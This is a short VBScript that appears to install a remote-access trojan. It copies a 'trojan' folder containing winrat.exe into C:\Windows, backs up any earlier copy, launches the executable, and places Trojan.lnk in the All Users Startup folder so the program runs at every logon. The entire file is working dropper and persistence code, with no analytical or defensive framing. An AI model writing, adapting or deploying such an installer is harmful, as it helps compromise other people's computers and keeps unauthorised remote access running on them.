Dim FSO,File
Dim Date,Hour,Day,Backuppath,Daystring
Set FSO = CreateObject("Scripting.FileSystemObject")
 
If Fso.FolderExists ("C:\Windows\trojan") Then
   Set File= FSO.GetFile("C:\Windows\trojan\winrat.exe") 
   Date=File.DateLastModified
   Day=DatePart("y",Date)
   Daystring=CStr(Day)
   Backuppath="C:\Windows\trojanbackup"+Daystring
   Fso.MoveFolder "C:\Windows\trojan", Backuppath
End If
 
FSO.CopyFolder ".\trojan", "c:\Windows\trojan", true
 
Set oShell = CreateObject("WScript.Shell") 
oShell.Run "C:\Windows\trojan\winrat.exe"
 
If Fso.FolderExists ("C:\Documents and Settings\All Users\Start Menu\Programs\Startup\") Then
If Fso.FileExists ("C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Trojan.lnk") Then
Else
   FSO.CopyFile "c:\Windows\trojan\Trojan.lnk","C:\Documents and Settings\All Users\Start Menu\Programs\Startup\", true
End If
End If
 
wscript.quit
